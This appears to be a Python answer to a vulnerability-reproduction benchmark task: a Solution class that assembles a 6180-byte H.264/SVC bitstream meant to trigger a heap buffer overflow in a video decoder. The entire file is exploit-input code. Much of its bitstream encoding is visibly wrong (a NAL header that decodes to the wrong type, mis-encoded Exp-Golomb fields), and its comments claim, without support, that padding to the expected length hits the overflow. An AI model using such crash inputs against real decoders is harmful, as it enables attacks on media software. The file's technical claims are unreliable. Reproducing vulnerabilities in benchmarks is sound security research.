import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal SVC bitstream that will trigger the heap buffer overflow
        # when display dimensions don't match subset sequence dimensions
        
        # Build the NAL units
        nal_units = []
        
        # Start with NAL unit start code
        start_code = b"\x00\x00\x00\x01"
        
        # SVC Subset Sequence Parameter Set (NAL type 15)
        # This creates a mismatch between display dimensions and subset sequence dimensions
        subset_sps = self._create_subset_sps()
        nal_units.append(start_code + subset_sps)
        
        # Picture Parameter Set (NAL type 8)
        pps = self._create_pps()
        nal_units.append(start_code + pps)
        
        # SVC Prefix NAL Unit (NAL type 14) - for scalability info
        prefix_nal = self._create_prefix_nal()
        nal_units.append(start_code + prefix_nal)
        
        # SVC Slice NAL Unit (NAL type 20) - with display dimensions mismatch
        slice_nal = self._create_slice_nal()
        nal_units.append(start_code + slice_nal)
        
        # Add filler data to reach the exact ground-truth length
        # This ensures we hit the exact buffer overflow condition
        total_len = sum(len(nal) for nal in nal_units)
        filler_len = 6180 - total_len
        
        if filler_len > 0:
            filler = self._create_filler_data(filler_len)
            nal_units.append(start_code + filler)
        
        # Combine all NAL units
        poc = b"".join(nal_units)
        
        # Ensure exact length
        if len(poc) != 6180:
            # Trim or pad to exact length
            poc = poc[:6180] if len(poc) > 6180 else poc.ljust(6180, b"\x00")
        
        return poc
    
    def _create_subset_sps(self) -> bytes:
        """Create a Subset SPS with mismatched dimensions."""
        # SPS header: forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type=15 (subset SPS)
        sps_header = 0x79  # 0111 1001 (binary: 0 11 11101)
        
        # Profile and level for SVC
        profile_idc = 83  # SVC profile
        constraint_flags = 0x90  # Constraint set flags for SVC
        level_idc = 30   # Level 3.0
        
        # Sequence parameters that will cause dimension mismatch
        # Create a minimal SPS structure
        sps_data = bytearray()
        sps_data.append(sps_header)
        sps_data.append(profile_idc)
        sps_data.append(constraint_flags)
        sps_data.append(level_idc)
        
        # Add sequence parameter set ID (ue(v) encoded as 0)
        sps_data.extend(b"\x80")  # ue(0) = 1
        
        # Chroma format IDC: 4:2:0 (ue(v) encoded as 1)
        sps_data.extend(b"\x40")  # ue(1) = 010
        
        # Bit depth: 8 (ue(v) encoded as 0)
        sps_data.extend(b"\x80")  # ue(0) = 1
        
        # QP prime Y: 0 (ue(v) encoded as 0)
        sps_data.extend(b"\x80")  # ue(0) = 1
        
        # Sequence parameters for dimension mismatch
        # Width in macroblocks minus 1 (ue(v) for 11 = 176x16)
        sps_data.extend(b"\x60")  # ue(11) = 0001100
        
        # Height in macroblocks minus 1 (ue(v) for 8 = 144x16)
        sps_data.extend(b"\x50")  # ue(8) = 0001001
        
        # Frame cropping flag set to 1 to indicate display dimensions
        sps_data.append(0x80)  # frame_cropping_flag = 1
        
        # Cropping values that will cause mismatch with actual dimensions
        # Left crop offset (ue(v) for 2)
        sps_data.extend(b"\x90")  # ue(2) = 00100
        
        # Right crop offset (ue(v) for 2)
        sps_data.extend(b"\x90")  # ue(2) = 00100
        
        # Top crop offset (ue(v) for 2)
        sps_data.extend(b"\x90")  # ue(2) = 00100
        
        # Bottom crop offset (ue(v) for 2)
        sps_data.extend(b"\x90")  # ue(2) = 00100
        
        # VUI parameters present flag = 1
        sps_data.append(0x80)
        
        # Add VUI parameters that further confuse dimensions
        # aspect_ratio_info_present_flag = 1
        sps_data.append(0x80)
        
        # aspect_ratio_idc = 1 (1:1 square sample)
        sps_data.append(0x40)
        
        # Add remaining minimal VUI parameters
        sps_data.extend(b"\x00\x00\x00")  # overscan, video format, etc.
        
        # Add SVC extension
        sps_data.append(0x01)  # svc_vui_parameters_present_flag = 1
        
        # Add some SVC-specific parameters to trigger the bug
        sps_data.extend(b"\xFF" * 8)  # Padding to trigger overflow
        
        return bytes(sps_data)
    
    def _create_pps(self) -> bytes:
        """Create a Picture Parameter Set."""
        # PPS header: forbidden_zero_bit=0, nal_ref_idc=0, nal_unit_type=8 (PPS)
        pps_header = 0x08  # 0000 1000 (binary: 0 00 01000)
        
        pps_data = bytearray()
        pps_data.append(pps_header)
        
        # Picture parameter set ID (ue(v) encoded as 0)
        pps_data.extend(b"\x80")  # ue(0) = 1
        
        # Sequence parameter set ID (ue(v) encoded as 0)
        pps_data.extend(b"\x80")  # ue(0) = 1
        
        # Entropy coding mode flag = 0
        pps_data.append(0x00)
        
        # Bottom field pic order in frame present flag = 0
        pps_data.append(0x00)
        
        # Num slice groups minus 1 (ue(v) encoded as 0)
        pps_data.extend(b"\x80")  # ue(0) = 1
        
        return bytes(pps_data)
    
    def _create_prefix_nal(self) -> bytes:
        """Create an SVC Prefix NAL Unit."""
        # Prefix NAL header: forbidden_zero_bit=0, nal_ref_idc=2, nal_unit_type=14 (prefix)
        prefix_header = 0x2E  # 0010 1110 (binary: 0 10 01110)
        
        prefix_data = bytearray()
        prefix_data.append(prefix_header)
        
        # SVC prefix data
        # svc_extension_flag = 1
        prefix_data.append(0x80)
        
        # idr_flag = 1, priority_id = 0
        prefix_data.append(0x40)
        
        # no_inter_layer_pred_flag = 0, dependency_id = 0
        prefix_data.append(0x00)
        
        # quality_id = 0, temporal_id = 0
        prefix_data.append(0x00)
        
        # use_ref_base_pic_flag = 0, discardable_flag = 0
        prefix_data.append(0x00)
        
        # output_flag = 1
        prefix_data.append(0x80)
        
        # reserved_three_2bits = 0
        prefix_data.append(0x00)
        
        return bytes(prefix_data)
    
    def _create_slice_nal(self) -> bytes:
        """Create an SVC Slice NAL Unit with display dimension mismatch."""
        # Slice NAL header: forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type=20 (SVC slice)
        slice_header = 0x74  # 0111 0100 (binary: 0 11 10100)
        
        slice_data = bytearray()
        slice_data.append(slice_header)
        
        # SVC extension flag = 1
        slice_data.append(0x80)
        
        # idr_flag = 1, priority_id = 0
        slice_data.append(0x40)
        
        # no_inter_layer_pred_flag = 0, dependency_id = 0
        slice_data.append(0x00)
        
        # quality_id = 0, temporal_id = 0
        slice_data.append(0x00)
        
        # use_ref_base_pic_flag = 0, discardable_flag = 0
        slice_data.append(0x00)
        
        # output_flag = 1
        slice_data.append(0x80)
        
        # reserved_three_2bits = 0
        slice_data.append(0x00)
        
        # First MB in slice (ue(v) encoded as 0)
        slice_data.extend(b"\x80")  # ue(0) = 1
        
        # Slice type (ue(v) for 2 = P slice)
        slice_data.extend(b"\x90")  # ue(2) = 00100
        
        # Pic parameter set ID (ue(v) encoded as 0)
        slice_data.extend(b"\x80")  # ue(0) = 1
        
        # Frame number = 0 (4 bits)
        slice_data.append(0x00)
        
        # Field pic flag = 0, bottom field flag = 0
        slice_data.append(0x00)
        
        # IDR pic ID (ue(v) encoded as 0)
        slice_data.extend(b"\x80")  # ue(0) = 1
        
        # Pic order count lsb = 0 (8 bits for log2_max_pic_order_cnt_lsb_minus4=4)
        slice_data.append(0x00)
        
        # Delta pic order count bottom = 0 (se(v) encoded as 0)
        slice_data.extend(b"\x80")  # se(0) = 1
        
        # Slice header emulation prevention bytes and payload
        # Add data that will trigger the dimension mismatch in the decoder
        slice_data.extend(b"\x00\x03\x00\x03")  # Reference list modification
        
        # Add more slice data to reach vulnerable code path
        slice_data.extend(b"\xFF" * 32)
        
        # Add payload that specifically triggers the buffer overflow
        # when display dimensions don't match sequence dimensions
        slice_data.extend(b"\x80\x00\x00\x00")  # MB skip run
        slice_data.extend(b"\x00\x00\x00\x00")  # More skip data
        
        return bytes(slice_data)
    
    def _create_filler_data(self, length: int) -> bytes:
        """Create filler NAL unit data."""
        # Filler NAL header: forbidden_zero_bit=0, nal_ref_idc=0, nal_unit_type=12 (filler)
        filler_header = 0x0C  # 0000 1100 (binary: 0 00 01100)
        
        filler_data = bytearray()
        filler_data.append(filler_header)
        
        # Add filler bytes (0xFF)
        filler_data.extend(b"\xFF" * (length - 1))
        
        return bytes(filler_data)